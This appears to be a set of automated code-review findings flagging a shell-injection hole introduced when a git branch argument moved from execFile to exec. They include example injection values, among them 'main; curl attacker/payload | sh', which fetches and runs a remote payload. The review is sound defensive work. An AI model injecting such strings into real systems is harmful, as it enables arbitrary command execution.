findings.title: [P1] Keep the branch argument out of the shell
findings.body: When `branch` contains caller-controlled text, interpolation into `exec()` allows shell metacharacters to execute additional commands with the process’s privileges—for example, `HEAD; <command>`. The previous `execFile("git", ["show", branch])` safely passed the value as a single argument. Retain argument-based process execution rather than invoking a shell.

findings.title: [P2] Preserve direct-child cancellation semantics
findings.body:
`exec()` returns the shell process rather than the actual command. For valid branch strings containing shell operators, such as `HEAD|sleep${IFS}30`, the shell creates descendants; calling `.kill()` on the returned process terminates only the shell, allowing descendants to continue consuming resources after cancellation.

_Recommend validating this comment independently._

findings.title: [P1] Keep the branch argument out of the shell
findings.body:
`exec` interpolates `branch` into a shell command, so input such as `HEAD; <command>` executes arbitrary commands with the caller’s privileges. The previous `execFile` call passed the value directly to Git without shell interpretation.

_Recommend validating this comment independently._

findings.title: [P1] Keep branch names out of the shell command
findings.body:
`branch` is interpolated directly into a shell command after replacing `execFile` with `exec`. A value such as `main; curl attacker/payload | sh` executes arbitrary commands with the application’s privileges. Any caller passing user-controlled branch names is vulnerable.

_Recommend validating this comment independently._
